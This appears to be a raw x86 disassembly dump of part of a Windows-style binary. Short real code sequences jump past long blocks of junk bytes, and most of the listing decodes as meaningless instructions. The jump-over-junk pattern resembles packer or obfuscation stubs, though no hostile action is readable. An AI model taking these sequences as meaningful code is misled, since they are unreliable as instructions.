  40f2fe:	or     bl,dl
  40f300:	std    
  40f301:	dec    edx
  40f302:	ss pop es
  40f304:	jl     0x40f2a2
  40f306:	pop    eax
  40f307:	sub    ah,al
  40f309:	sbb    DWORD PTR [ecx+0x52b745e1],0x6c33baaf
  40f313:	dec    esp
  40f314:	push   0xffffffa3
  40f316:	lods   eax,DWORD PTR ds:[esi]
  40f317:	cwde   
  40f318:	xor    esp,DWORD PTR [esp+ebp*8]
  40f31b:	inc    edi
  40f31c:	jle    0x40f343
  40f31e:	adc    al,0x88
  40f320:	push   ds
  40f321:	mov    dh,0x4b
  40f323:	bound  ecx,QWORD PTR [edx-0x7e]
  40f326:	cli    
  40f327:	sub    al,0x87
  40f329:	ror    BYTE PTR [edx+0x7b586f07],cl
  40f32f:	cmp    DWORD PTR [ebx+0x57415eb8],0x1
  40f336:	add    edi,DWORD PTR [edi+0x6d]
  40f339:	std    
  40f33a:	pop    ecx
  40f33b:	arpl   WORD PTR [ebp+0xe],si
  40f33e:	in     eax,0xde
  40f340:	pop    ecx
  40f341:	pop    ebp
  40f342:	or     edi,ebp
  40f344:	or     eax,0x6440abfb
  40f349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f34a:	add    al,0x1d
  40f34c:	sar    bh,0xeb
  40f34f:	xor    al,0x35
  40f351:	xchg   esp,eax
  40f352:	pop    ds
  40f353:	ins    DWORD PTR es:[edi],dx
  40f354:	jmp    0x8506:0x37ecdd90
  40f35b:	jecxz  0x40f2ef
  40f35d:	ins    DWORD PTR es:[edi],dx
  40f35e:	xchg   ebx,eax
  40f35f:	sub    BYTE PTR [eax+0x58],al
  40f362:	pop    eax
  40f363:	les    eax,FWORD PTR ds:[ecx-0x3cb042e3]
  40f36a:	mov    edx,0xf17d1c8c
  40f36f:	mov    ah,0x1e
  40f371:	js     0x40f368
  40f373:	or     bh,0x4
  40f376:	mov    WORD PTR [edi+ebp*2],gs
  40f379:	int3   
  40f37a:	xor    ecx,DWORD PTR [ebx+0x37]
  40f37d:	vlddqu ymm3,[ebx]
  40f381:	pop    edi
  40f382:	push   ss
  40f383:	push   ds
  40f384:	mov    ebp,0x3b0d82a9
  40f389:	mov    al,ds:0xf1ae5cd1
  40f38e:	lods   eax,DWORD PTR ds:[esi]
  40f38f:	jmp    0x40f380
  40f391:	dec    eax
  40f392:	mov    bl,0x5a
  40f394:	fidiv  DWORD PTR [edx+0x4c07fa41]
  40f39a:	js     0x40f3f8
  40f39c:	push   esi
  40f39d:	arpl   WORD PTR [edi+0x43],ax
  40f3a0:	rcr    ch,0xb0
  40f3a3:	ja     0x40f41c
  40f3a5:	or     DWORD PTR [edx+0x3],edx
  40f3a8:	fimul  WORD PTR [ebx+eax*2-0x50]
  40f3ac:	aad    0x4f
  40f3ae:	xchg   ebx,eax
  40f3af:	dec    esp
  40f3b0:	add    BYTE PTR [ebp-0x1c],cl
  40f3b3:	or     dh,cl
  40f3b5:	sub    eax,0x3f40049d
  40f3ba:	push   0x616e4c57
  40f3bf:	adc    eax,0xad0db844
  40f3c4:	mov    eax,ds:0xdd130c74
  40f3c9:	daa    
  40f3ca:	enter  0xf1e1,0x1e
  40f3ce:	repnz xchg edx,eax
  40f3d0:	sbb    al,0x56
  40f3d2:	push   ss
  40f3d3:	dec    edx
  40f3d4:	inc    esi
  40f3d5:	dec    edi
  40f3d6:	and    BYTE PTR [eax-0x272ed58d],cl
  40f3dc:	ret    
  40f3dd:	sub    BYTE PTR [edi],al
  40f3df:	lds    esp,FWORD PTR [edi-0x4f9cdac3]
  40f3e5:	mov    ch,0x11
  40f3e7:	in     eax,dx
  40f3e8:	mov    eax,ds:0x57e3dd61
  40f3ed:	sub    BYTE PTR [edx-0x3f],ah
  40f3f0:	dec    edi
  40f3f1:	adc    BYTE PTR [eax-0x28572b29],ah
  40f3f7:	pusha  
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	lds    eax,FWORD PTR [ecx+0x32]
  40f42c:	icebp  
  40f42d:	scas   eax,DWORD PTR es:[edi]
  40f42e:	stos   DWORD PTR es:[edi],eax
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f41d
  40f436:	mov    ds:0x3da382e7,al
  40f43b:	lahf   
  40f43c:	outs   dx,BYTE PTR ds:[esi]
  40f43d:	out    0xb9,al
  40f43f:	mul    BYTE PTR [eax-0x3afadb80]
  40f445:	fdivr  DWORD PTR [esi+0x6d310f20]
  40f44b:	add    eax,0x5b6aebe0
  40f450:	test   eax,0xb3a2e2ed
  40f455:	push   ss
  40f456:	sbb    cl,BYTE PTR [ecx]
  40f458:	mov    edx,0x4784a3b6
  40f45d:	fadd   QWORD PTR [eax+0x30]
  40f460:	ja     0x40f45a
  40f462:	ins    DWORD PTR es:[edi],dx
  40f463:	cmp    al,0xf8
  40f465:	adc    cl,cl
  40f467:	push   edx
  40f468:	outs   dx,DWORD PTR ds:[esi]
  40f469:	hlt    
  40f46a:	das    
  40f46b:	fsubr  DWORD PTR ds:0xbf91d664
  40f471:	or     dl,ah
  40f473:	push   ecx
  40f474:	(bad)  
  40f475:	out    0xc9,al
  40f477:	xchg   edx,eax
  40f478:	inc    ecx
  40f479:	mov    DWORD PTR [esi],0x89b7ec4a
  40f47f:	mov    ecx,0x60499289
  40f484:	idiv   DWORD PTR [edi-0x4c]
  40f487:	add    bl,BYTE PTR fs:[esp+eiz*8-0x792dde6c]
  40f48f:	or     DWORD PTR [ebp-0x7126a758],edx
  40f495:	cmc    
  40f496:	ins    DWORD PTR es:[edi],dx
  40f497:	sub    BYTE PTR [edx],0x12
  40f49a:	test   DWORD PTR [eax+0x66cf231d],0x70ecca47
  40f4a4:	sar    BYTE PTR [ebx+0x10],1
  40f4a7:	out    dx,eax
  40f4a8:	mov    eax,cs:0x6a0ff075
  40f4ae:	and    edx,DWORD PTR [ebp-0x7db387e9]
  40f4b4:	sub    BYTE PTR [ebx-0x27],dl
  40f4b7:	xchg   esp,eax
  40f4b8:	es push ebx
  40f4ba:	lahf   
  40f4bb:	or     DWORD PTR [edx+0x60dab5fb],ecx
  40f4c1:	daa    
  40f4c2:	(bad)  
  40f4c3:	pusha  
  40f4c4:	mov    ds:0x2592c476,eax
  40f4c9:	mov    al,0xaa
  40f4cb:	sahf   
  40f4cc:	xchg   ebp,eax
  40f4cd:	adc    dh,ah
  40f4cf:	loop   0x40f51c
  40f4d1:	or     eax,DWORD PTR [eax-0x46]
  40f4d4:	in     al,0xbe
  40f4d6:	int    0x9d
  40f4d8:	neg    DWORD PTR [ebx-0x78f2a7a2]
  40f4de:	xor    ebx,DWORD PTR [edx-0x6f]
  40f4e1:	xchg   ecx,eax
  40f4e2:	push   edi
  40f4e3:	dec    ecx
  40f4e4:	pop    eax
  40f4e5:	stc    
  40f4e6:	mov    ds:0x76ecb5da,eax
  40f4eb:	adc    DWORD PTR [ebx-0xf],0x822ded15
  40f4f2:	dec    ecx
  40f4f3:	pop    eax
  40f4f4:	inc    ebp
  40f4f5:	xor    al,0x59
  40f4f7:	jne    0x40f4b9
  40f4f9:	div    BYTE PTR [edx]
  40f4fb:	addr16 mov dl,0x40
  40f4fe:	push   ebp
  40f4ff:	mov    eax,0xaf1f2256
  40f504:	mov    al,0xe1
  40f506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f507:	sti    
  40f508:	into   
  40f509:	push   0xb6104748
  40f50e:	mov    edx,0xd3d0aa9d
  40f513:	mov    WORD PTR [edx+0x175a71b1],?
  40f519:	es std 
  40f51b:	out    dx,al
  40f51c:	iret   
  40f51d:	mov    BYTE PTR [esi-0x26],bh
  40f520:	mov    ?,WORD PTR [edx]
  40f522:	mov    ds:0xe42e32ac,eax
  40f527:	ret    0x7cc
  40f52a:	push   ds
  40f52b:	imul   eax,edx,0x6
  40f52e:	loopne 0x40f592
  40f530:	in     eax,0xc9
  40f532:	add    dl,bh
  40f534:	mov    fs,ebp
  40f536:	adc    ecx,DWORD PTR [ecx-0x25f71f1a]
  40f53c:	and    cl,BYTE PTR [ecx-0xb]
  40f53f:	ficomp WORD PTR ds:0xb9a76160
  40f545:	mul    DWORD PTR [eax]
  40f547:	inc    esp
  40f548:	test   eax,0x6001b712
  40f54d:	scas   eax,DWORD PTR es:[edi]
  40f54e:	jns    0x40f519
  40f550:	das    
  40f551:	in     eax,dx
  40f552:	sti    
  40f553:	popf   
  40f554:	inc    ebx
  40f555:	js     0x40f596
  40f557:	jecxz  0x40f5ba
  40f559:	out    dx,al
  40f55a:	test   ebx,ebx
  40f55c:	xor    eax,0xd42cdfb8
  40f561:	loope  0x40f54d
  40f563:	jmp    0xf789a1d1
  40f568:	xchg   DWORD PTR [ecx+0x19],esp
  40f56b:	out    dx,al
  40f56c:	retf   
  40f56d:	inc    edi
  40f56e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f56f:	cmp    ebp,DWORD PTR [edx-0x3e]
  40f572:	dec    ebp
  40f573:	jnp    0x40f540
  40f575:	xchg   BYTE PTR gs:[edi+0x3221f745],bl
  40f57c:	jbe    0x40f503
  40f57e:	mov    esi,0x7bd5d5af
  40f583:	mov    esi,0x209522f
  40f588:	into   
  40f589:	mov    ds:0x51c55365,al
  40f58e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f58f:	adc    ah,BYTE PTR [ebx]
  40f591:	div    ch
  40f593:	ins    BYTE PTR es:[edi],dx
  40f594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f595:	imul   ebx,eax,0x565e984f
  40f59b:	shl    DWORD PTR [esi],1
  40f59d:	jae    0x40f555
  40f59f:	imul   edi,DWORD PTR ss:[eax],0xf2f05493
  40f5a6:	xchg   ebx,ebp
  40f5a8:	retf   
  40f5a9:	outs   dx,DWORD PTR ds:[esi]
  40f5aa:	jbe    0x40f585
  40f5ac:	sbb    al,0x78
  40f5ae:	xchg   ebx,eax
  40f5af:	jp     0x40f534
  40f5b1:	aad    0x96
  40f5b3:	jne    0x40f5ee
  40f5b5:	lods   al,BYTE PTR ds:[esi]
  40f5b6:	xor    eax,0x3084f969
  40f5bb:	sbb    BYTE PTR [edx-0x62],ch
  40f5be:	outs   dx,BYTE PTR ds:[esi]
  40f5bf:	ins    DWORD PTR es:[edi],dx
  40f5c0:	adc    eax,0x32aa85cf
  40f5c5:	inc    edi
  40f5c6:	retf   
  40f5c7:	loope  0x40f600
  40f5c9:	mov    esi,0xa6f4d23f
  40f5ce:	sbb    ebp,edi
  40f5d0:	jge    0x40f5a3
  40f5d2:	(bad)  
  40f5d3:	sbb    eax,0xd5b683df
  40f5d8:	arpl   WORD PTR [ebx+ecx*2],ax
  40f5db:	fldcw  WORD PTR [ecx+0x6e]
  40f5de:	inc    ecx
  40f5df:	call   0xbe6b:0x151bd210
  40f5e6:	mov    dl,bh
  40f5e8:	mov    ebx,0xfd459dea
  40f5ed:	nop
  40f5ee:	ja     0x40f65a
  40f5f0:	mov    ?,ebx
  40f5f2:	cdq    
  40f5f3:	sub    bh,BYTE PTR [ecx+eax*1-0x61ea2090]
  40f5fa:	call   0x97ae:0xbc380333
  40f601:	pop    ecx
  40f602:	or     ah,al
  40f604:	cli    
  40f605:	jne    0x40f63c
  40f607:	int3   
  40f608:	lods   eax,DWORD PTR ds:[esi]
  40f609:	scas   al,BYTE PTR es:[edi]
  40f60a:	sbb    eax,0x3413588d
  40f60f:	jae    0x40f5dd
  40f611:	mov    dh,0x61
  40f613:	shl    BYTE PTR [ebx-0x12],0xda
  40f617:	loope  0x40f624
  40f619:	sahf   
  40f61a:	in     eax,dx
  40f61b:	aas    
  40f61c:	jmp    0x6166a548
  40f621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f622:	scas   eax,DWORD PTR es:[edi]
  40f623:	daa    
  40f624:	out    0x2c,al
  40f626:	mov    ds:0x6c4e0489,al
  40f62b:	ss cli 
  40f62d:	adc    edi,DWORD PTR [ebx]
  40f62f:	jmp    0xf523:0xdabcdce8
  40f636:	dec    esp
  40f637:	mul    DWORD PTR [ecx+0x2b29bdc4]
  40f63d:	out    0x32,eax
  40f63f:	xchg   BYTE PTR [edx],cl
  40f641:	in     eax,dx
  40f642:	add    DWORD PTR [edx+0x4d3f0c98],0xa94d3997
  40f64c:	jne    0x40f64d
  40f64e:	mov    ecx,0x8f21180e
  40f653:	xchg   BYTE PTR [edi-0x1f],ah
  40f656:	mov    al,0x10
  40f658:	sbb    al,0x87
  40f65a:	xchg   esp,eax
  40f65b:	jl     0x40f6d0
  40f65d:	call   0x7eaf:0x885de2b1
  40f664:	fmul   DWORD PTR [esi-0x1f8c67b4]
  40f66a:	jae    0x40f655
  40f66c:	(bad)  
  40f66d:	pushf  
  40f66e:	xlat   BYTE PTR ds:[ebx]
  40f66f:	(bad)  
  40f670:	jg     0x40f684
  40f672:	shl    ebp,cl
  40f674:	dec    DWORD PTR [edi+0x2d28c023]
  40f67a:	add    DWORD PTR [ecx-0x788cc7ee],0x2b
  40f681:	aas    
  40f682:	jb     0x40f6d3
  40f684:	mov    eax,0xb72f81f8
  40f689:	inc    edi
  40f68a:	mov    cl,0x56
  40f68c:	jmp    0xc3de1044
  40f691:	lock retf 0x483c
  40f695:	mov    bh,0x68
  40f697:	adc    dh,BYTE PTR [esi+0x42]
  40f69a:	cmp    eax,DWORD PTR [edi-0x7f]
  40f69d:	sub    DWORD PTR [esi+eiz*2-0x226348fb],eax
  40f6a4:	rcr    BYTE PTR [ebx+ebp*1],cl
  40f6a7:	cmp    eax,0x43dcc517
  40f6ac:	sub    BYTE PTR [edx],bl
  40f6ae:	push   ds
  40f6af:	dec    esi
  40f6b0:	xchg   edx,eax
  40f6b1:	push   0xffffffa3
  40f6b3:	add    esp,DWORD PTR [edx]
  40f6b5:	add    eax,0xe0ee7465
  40f6ba:	xor    bh,BYTE PTR [esi-0x5ee487bc]
  40f6c0:	dec    edx
  40f6c1:	sbb    edi,edi
  40f6c3:	mov    ebp,0xa59b4a0f
  40f6c8:	pop    ds
  40f6c9:	and    BYTE PTR [esi+0x33fd98e7],ch
  40f6cf:	pop    esi
  40f6d0:	sub    DWORD PTR [ecx],esi
  40f6d2:	out    dx,al
  40f6d3:	xor    bh,BYTE PTR ds:0xc0878bb9
  40f6d9:	push   edx
  40f6da:	add    al,0x9
  40f6dc:	lods   al,BYTE PTR ds:[esi]
  40f6dd:	inc    ecx
  40f6de:	sbb    al,0xe4
  40f6e0:	mov    eax,ds:0xedaeafeb
  40f6e5:	loop   0x40f67b
  40f6e7:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f6ee:	sub    DWORD PTR ds:0x433827,0x5c72
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	adc    eax,0xdde1dd04
  40f71b:	mov    dh,0x7e
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f6e1
  40f723:	add    al,0x3a
  40f725:	mov    edi,0x3c9213c5
  40f72a:	sahf   
  40f72b:	mov    eax,ecx
  40f72d:	outs   dx,DWORD PTR ds:[esi]
  40f72e:	or     esp,esi
  40f730:	push   ds
  40f731:	mov    ecx,0x610e288f
  40f736:	shl    DWORD PTR [ebx-0x1],0xe8
  40f73a:	inc    ecx
  40f73b:	adc    ebp,edx
  40f73d:	lock or edi,DWORD PTR [edi+0x1f95f53b]
  40f744:	fidivr WORD PTR [edi+0x50]
  40f747:	imul   esi,DWORD PTR [eax-0x725b13f],0x96dbcef6
  40f751:	(bad)  
  40f752:	fbld   TBYTE PTR [ebp-0x1]
  40f755:	test   al,0xd4
  40f757:	push   ecx
  40f758:	(bad)  
  40f759:	push   edx
  40f75a:	mov    edi,0x21787300
  40f75f:	pushf  
  40f760:	js     0x40f777
  40f762:	mov    ecx,0x2b7294c6
  40f767:	jmp    0x7ab0:0xdc9f9b2f
  40f76e:	dec    edi
  40f76f:	mov    eax,ds:0x7c1a7ef0
  40f774:	push   edx
  40f775:	push   0xbcc1d738
  40f77a:	mov    ds:0x940f87a4,eax
  40f77f:	inc    eax
  40f780:	inc    ecx
  40f781:	cmp    BYTE PTR [eax],al
  40f783:	in     al,dx
  40f784:	pop    ecx
  40f785:	pop    esi
  40f786:	enter  0x1b9d,0x1f
  40f78a:	jecxz  0x40f772
  40f78c:	(bad)  [ebx-0x50b166ba]
  40f792:	jne    0x40f808
  40f794:	xchg   esp,eax
  40f795:	bound  ebx,QWORD PTR es:[edx]
  40f798:	mov    edx,0xfc52cc0
  40f79d:	mov    edx,DWORD PTR [eax+0x78]
  40f7a0:	fdivr  st(6),st
  40f7a2:	push   ebp
  40f7a3:	xor    BYTE PTR [edx],0xdf
  40f7a6:	or     al,0xe7
  40f7a9:	mov    esi,0xea751581
  40f7ae:	pop    ss
  40f7af:	test   DWORD PTR [eax],ecx
  40f7b1:	fld    DWORD PTR [ebx+ebx*2-0x30]
  40f7b5:	add    ebx,edx
  40f7b7:	jg     0x40f74b
  40f7b9:	iret   
  40f7ba:	push   ss
  40f7bb:	sbb    BYTE PTR [ebp-0x31],ah
  40f7be:	popa   
  40f7bf:	into   
  40f7c0:	cmp    dh,BYTE PTR [ebp+0x3a]
  40f7c3:	dec    edi
  40f7c4:	test   eax,0x52f3bbf4
  40f7c9:	je     0x40f821
  40f7cb:	jp     0x40f752
  40f7cd:	pop    es
  40f7ce:	retf   0xc535
  40f7d1:	cmp    al,0x70
  40f7d3:	or     ch,BYTE PTR [esi+0x7f]
  40f7d6:	ins    BYTE PTR es:[edi],dx
  40f7d7:	and    bl,0x12
  40f7da:	(bad)  
  40f7dc:	mov    al,ds:0x1a7aa90c
  40f7e1:	pop    eax
  40f7e2:	add    DWORD PTR [ecx+0x1e98aa5c],esi
  40f7e8:	loope  0x40f7ac
  40f7ea:	dec    BYTE PTR [esi]
  40f7ec:	add    bh,dh
  40f7ee:	ds push es
  40f7f0:	xor    bl,bl
  40f7f2:	add    edx,DWORD PTR [esi+0x15020608]
  40f7f8:	enter  0x1c8c,0xc2
  40f7fc:	jle    0x40f876
  40f7fe:	scas   eax,DWORD PTR es:[edi]
  40f7ff:	sahf   
  40f800:	xor    DWORD PTR [edi-0x3ffa0678],edi
  40f806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f807:	(bad)  
  40f808:	ror    bh,0x5
  40f80b:	fwait
  40f80c:	push   ds
  40f80d:	inc    edi
  40f80e:	sub    ebx,edi
  40f810:	fdiv   QWORD PTR [ecx+ecx*1+0x5b]
  40f814:	jae    0x40f7fc
  40f816:	push   esi
  40f817:	lds    ebx,FWORD PTR [ecx+eiz*4]
  40f81a:	push   ebx
  40f81b:	inc    esp
  40f81c:	mov    dl,0xca
  40f81e:	shl    DWORD PTR [ebp+0x7cdf410e],cl
  40f824:	popa   
  40f825:	xchg   edi,eax
  40f826:	pusha  
  40f827:	int3   
  40f828:	in     al,0xe9
  40f82a:	xchg   ebx,eax
  40f82b:	xor    al,0xe7
  40f82d:	in     al,dx
  40f82e:	jg     0x40f849
  40f830:	xchg   ebp,eax
  40f831:	shl    BYTE PTR [edx+0x10dd2a66],0xda
  40f838:	ret    
  40f839:	or     al,0x35
  40f83b:	(bad)  
  40f83c:	adc    BYTE PTR [ebp+0x5a68030],ah
  40f842:	push   esp
  40f843:	push   0xaa2d72a1
  40f848:	fs push edx
  40f84a:	xchg   DWORD PTR [edi+0x2f38bea8],esp
  40f850:	xchg   esp,eax
  40f851:	out    dx,eax
  40f852:	adc    esp,DWORD PTR [edx]
  40f854:	aam    0x97
  40f856:	sub    al,0xc6
  40f858:	(bad)  
  40f859:	(bad)  
  40f85a:	push   eax
  40f85b:	aam    0x33
  40f85d:	in     eax,dx
  40f85e:	scas   eax,DWORD PTR es:[edi]
  40f85f:	push   0xffffffb9
  40f861:	dec    ebx
  40f862:	ins    DWORD PTR es:[edi],dx
  40f863:	nop
  40f864:	jns    0x40f7f1
  40f866:	push   ebp
  40f867:	lea    ebp,[ebx+0x66]
  40f86a:	ins    DWORD PTR es:[edi],dx
  40f86b:	int3   
  40f86c:	inc    ecx
  40f86d:	not    al
  40f86f:	mov    edx,0xf246cf1
  40f874:	xchg   DWORD PTR [edi],edi
  40f876:	inc    edx
  40f877:	jnp    0x40f8ba
  40f879:	xchg   edx,eax
  40f87a:	jl     0x40f8ba
  40f87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f87d:	xchg   esp,eax
  40f87e:	call   FWORD PTR [ebx-0x76]
  40f881:	mov    ecx,0xb339d125
  40f886:	ret    0xb6a7
  40f889:	push   ebx
  40f88a:	repz and al,0x24
  40f88d:	(bad)  
  40f88e:	fdivp  st(4),st
  40f890:	out    0x76,eax
  40f892:	inc    ebx
  40f893:	std    
  40f894:	test   BYTE PTR [eax+0x1d6b9825],dl
  40f89a:	push   cs
  40f89b:	jne    0x40f875
  40f89d:	add    al,0x67
  40f89f:	enter  0xb84e,0x52
  40f8a3:	xchg   BYTE PTR [ecx],bh
  40f8a5:	mov    dh,0x58
  40f8a7:	daa    
  40f8a8:	or     BYTE PTR [ebx+0x12],dh
  40f8ab:	pop    ebp
  40f8ac:	ret    0xfc78
  40f8af:	mov    bh,0xc2
  40f8b1:	or     DWORD PTR [esi+0x7b28c969],edx
  40f8b7:	pop    edx
  40f8b8:	data16 icebp 
  40f8ba:	cmp    DWORD PTR ds:0x4580616b,edi
  40f8c0:	jns    0x40f8ee
  40f8c2:	aas    
  40f8c3:	mov    eax,0x9eda851d
  40f8c8:	jle    0x40f8b9
  40f8ca:	das    
  40f8cb:	cmp    BYTE PTR [edi-0x24],al
  40f8ce:	mov    dh,0x9d
  40f8d0:	jo     0x40f940
  40f8d2:	test   DWORD PTR [edi],ebx
  40f8d4:	sahf   
  40f8d5:	data16 cli 
  40f8d7:	rcl    esp,cl
  40f8d9:	push   esi
  40f8da:	fsubp  st(3),st
  40f8dc:	aaa    
  40f8dd:	push   es
  40f8de:	out    0xc4,al
  40f8e0:	pop    esi
  40f8e1:	ret    
  40f8e2:	out    dx,eax
  40f8e3:	jno    0x40f933
  40f8e5:	mov    ds:0x5a8c5661,al
  40f8ea:	mov    ebp,0xdc6216ec
  40f8ef:	int    0x31
  40f8f1:	mov    eax,0x56bd3b6d
  40f8f6:	cmp    bh,BYTE PTR [ebp+0x19aa6807]
  40f8fc:	hlt    
  40f8fd:	dec    esp
  40f8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ff:	add    eax,0xbe64c8bf
  40f904:	ror    BYTE PTR [eax+eax*2-0x28],0x9c
  40f909:	in     eax,0xa9
  40f90b:	outs   dx,DWORD PTR ds:[esi]
  40f90c:	adc    DWORD PTR [ecx-0x12],0x1a
  40f910:	inc    edi
  40f911:	fdiv   st,st(5)
  40f913:	push   es
  40f914:	test   BYTE PTR [ebx],al
  40f916:	mov    bl,BYTE PTR ds:0xcf59e606
  40f91c:	ret    
  40f91d:	gs mov al,0x35
  40f921:	lock pop esi
  40f923:	inc    edx
  40f924:	adc    dh,BYTE PTR [esp+ebp*2]
  40f927:	sti    
  40f928:	xor    eax,0xa98d4e6a
  40f92d:	outs   dx,BYTE PTR ds:[esi]
  40f92e:	sbb    al,0xa8
  40f930:	sbb    DWORD PTR [eax-0x80],esp
  40f933:	push   ss
  40f934:	into   
  40f935:	les    edx,FWORD PTR [eax+0x4c]
  40f938:	nop
  40f939:	mov    eax,ds:0x6f6705e
  40f93e:	iret   
  40f93f:	mov    WORD PTR [ebp-0x38],cs
  40f942:	fild   QWORD PTR [eax-0x1494e46e]
  40f948:	mov    bh,0x9f
  40f94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f94b:	mov    al,0xe4
  40f94d:	(bad)  
  40f94e:	jge    0x40f8ed
  40f950:	cwde   
  40f951:	jns    0x40f906
  40f953:	test   al,0x55
  40f955:	(bad)  
  40f956:	dec    edi
  40f957:	scas   eax,DWORD PTR es:[edi]
  40f958:	push   ds
  40f959:	(bad)  
  40f95a:	inc    edi
  40f95b:	sub    BYTE PTR ss:[edi],dh
  40f95e:	or     al,0xcb
  40f960:	jge    0x40f9cf
  40f962:	mov    esi,0xef3c4f51
  40f967:	lock mov esi,0x63f93b9e
  40f96d:	pop    ss
  40f96e:	daa    
  40f96f:	cmp    al,0x9d
  40f971:	adc    al,0xfe
  40f973:	inc    edi
  40f974:	adc    edi,DWORD PTR [edx+esi*2]
  40f977:	inc    edi
  40f978:	sbb    edx,ebx
  40f97a:	(bad)  ss:[esi]
  40f97d:	push   es
  40f97e:	push   edi
  40f97f:	test   DWORD PTR [ebp-0x78],ebp
  40f982:	(bad)  
  40f984:	(bad)  
  40f985:	repnz push edx
  40f987:	sti    
  40f988:	push   ss
  40f989:	scas   al,BYTE PTR es:[edi]
  40f98a:	push   es
  40f98b:	repz cmp DWORD PTR [ebp-0x1cf6397f],eax
  40f992:	sbb    BYTE PTR [esi+0x6d],cl
  40f995:	dec    ebx
  40f996:	cmp    BYTE PTR [esi+0x66],ch
  40f999:	dec    ebp
  40f99a:	stos   BYTE PTR es:[edi],al
  40f99b:	in     eax,dx
  40f99c:	mov    WORD PTR [edi+esi*1-0x1cc28a60],ds
  40f9a3:	sbb    eax,0xc33ba258
  40f9a8:	mov    ds:0xae47dd39,eax
  40f9ad:	pop    esp
  40f9ae:	dec    edx
  40f9af:	idiv   BYTE PTR [eax+ecx*8-0x1c]
  40f9b3:	sbb    eax,0x4168920b
  40f9b8:	lods   eax,DWORD PTR ds:[esi]
  40f9b9:	jns    0x40f976
  40f9bb:	dec    ebp
  40f9bc:	push   ss
  40f9bd:	mov    edi,0x3adcdb9c
  40f9c2:	sbb    DWORD PTR [eax],edi
  40f9c4:	dec    BYTE PTR [ebx]
  40f9c6:	out    0x4e,al
  40f9c8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40f9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9cb:	(bad)  
  40f9cc:	cs jns 0x40f9f1
  40f9cf:	xchg   ecx,eax
  40f9d0:	(bad)  
  40f9d1:	stos   DWORD PTR es:[edi],eax
  40f9d2:	pop    edi
  40f9d3:	clc    
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	sub    al,0xef
  40fa12:	sub    BYTE PTR [esi+0x7e7eb50b],bh
  40fa18:	lods   al,BYTE PTR ds:[esi]
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40f99d
  40fa1d:	stos   BYTE PTR es:[edi],al
  40fa1e:	hlt    
  40fa1f:	loope  0x40fa48
  40fa21:	mov    eax,ds:0xdd33a3fa
  40fa26:	mov    esi,DWORD PTR [edi+0x1037cf7c]
  40fa2c:	or     cl,ch
  40fa2e:	shl    DWORD PTR [ebx-0x2d],cl
  40fa31:	sar    DWORD PTR [ecx+0x10aebcac],1
  40fa37:	leave  
  40fa38:	addr16 int 0x7f
  40fa3b:	enter  0x1db7,0x99
  40fa3f:	and    eax,0xd802ef
  40fa44:	mov    WORD PTR [edi-0x1264fbf0],fs
  40fa4a:	and    edx,DWORD PTR [esi]
  40fa4c:	call   0xb7b4:0xd6af4820
  40fa53:	dec    ebp
  40fa54:	retf   0xe7c3
  40fa57:	adc    eax,0xd3bb7f23
  40fa5c:	xor    eax,0xb1394e2a
  40fa61:	les    ebp,FWORD PTR [edi+0x1d]
  40fa64:	jmp    0x8efb3e1d
  40fa69:	mov    ?,WORD PTR [edi-0x7]
  40fa6c:	int3   
  40fa6d:	mov    DWORD PTR [edi-0x77787c25],ebx
  40fa73:	jl     0x40fa8c
  40fa75:	ins    BYTE PTR es:[edi],dx
  40fa76:	mov    cs,WORD PTR [edx-0x7bb307ee]
  40fa7c:	test   ecx,0x9bf72f6b
  40fa82:	arpl   sp,si
  40fa84:	test   DWORD PTR [eax+0x54fd0d17],ecx
  40fa8a:	stc    
  40fa8b:	popf   
  40fa8c:	inc    ebx
  40fa8d:	mov    ebp,0xc73374a6
  40fa92:	loope  0x40fac3
  40fa94:	lea    ebx,ds:0xab9721b1
